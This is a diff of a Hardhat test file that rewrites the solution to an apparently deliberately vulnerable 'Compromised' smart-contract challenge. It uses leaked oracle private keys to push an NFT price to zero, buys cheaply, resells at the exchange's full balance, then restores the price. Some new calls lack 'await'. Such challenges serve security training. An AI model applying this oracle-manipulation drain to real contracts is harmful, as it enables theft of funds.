@@ -1,4 +1,3 @@
-const { BigNumber } = require("@ethersproject/bignumber");
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
@@ -88,60 +87,32 @@ describe("Compromised challenge", function () {
         .map((el) => Buffer.from(el, "hex").toString())
         .join("")
     );
-    walletPrivateKeyOne = new ethers.Wallet(privateKeyTxtOne);
-    walletPrivateKeyTwo = new ethers.Wallet(privateKeyTxtTwo);
-    const oracleABI = ["function postPrice(string, uint)"];
-    let iface = new ethers.utils.Interface(oracleABI);
+    const wallet1 = new ethers.Wallet(privateKeyTxtOne, attacker.provider);
+    const wallet2 = new ethers.Wallet(privateKeyTxtTwo, attacker.provider);
 
-    const txData = (etherAmount) =>
-      iface.encodeFunctionData("postPrice", [
-        "DVNFT",
-        ethers.utils.parseEther(etherAmount),
-      ]);
-    const tx = (etherAmount, nonce) => {
-      return {
-        to: this.oracle.address,
-        data: txData(etherAmount),
-        gasLimit: 100000,
-        gasPrice: 1000000000,
-        nonce,
-      };
-    };
+    await this.oracle
+      .connect(wallet1)
+      .postPrice("DVNFT", ethers.utils.parseUnits("0", "wei"));
+    await this.oracle
+      .connect(wallet2)
+      .postPrice("DVNFT", ethers.utils.parseUnits("0", "wei"));
 
-    const signedTxLowerPriceOne = await walletPrivateKeyOne.signTransaction(
-      tx("0.01", 0)
-    );
-    const signedTxLowerPriceTwo = await walletPrivateKeyTwo.signTransaction(
-      tx("0.01", 0)
-    );
-    await ethers.provider.sendTransaction(signedTxLowerPriceOne);
-    await ethers.provider.sendTransaction(signedTxLowerPriceTwo);
+    await this.exchange
+      .connect(attacker)
+      .buyOne({ value: ethers.utils.parseEther("0.01") });
 
-    const options = { value: ethers.utils.parseEther("0.01") };
-    await this.exchange.connect(attacker).buyOne(options);
-    const exchangeBalance = await ethers.provider
-      .getBalance(this.exchange.address)
-      .then((a) => String(a.toString() / 1e18));
-    const signedTxOne = await walletPrivateKeyOne.signTransaction(
-      tx(exchangeBalance, 1)
-    );
-    const signedTxTwo = await walletPrivateKeyTwo.signTransaction(
-      tx(exchangeBalance, 1)
-    );
-    await ethers.provider.sendTransaction(signedTxOne);
-    await ethers.provider.sendTransaction(signedTxTwo);
+    this.oracle
+      .connect(wallet1)
+      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+    this.oracle
+      .connect(wallet2)
+      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
 
     await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
     await this.exchange.connect(attacker).sellOne(0);
 
-    const signedTxEqualPriceOne = await walletPrivateKeyOne.signTransaction(
-      tx("999", 2)
-    );
-    const signedTxEqualPriceTwo = await walletPrivateKeyTwo.signTransaction(
-      tx("999", 2)
-    );
-    await ethers.provider.sendTransaction(signedTxEqualPriceOne);
-    await ethers.provider.sendTransaction(signedTxEqualPriceTwo);
+    this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+    this.oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE);
   });
 
   after(async function () {
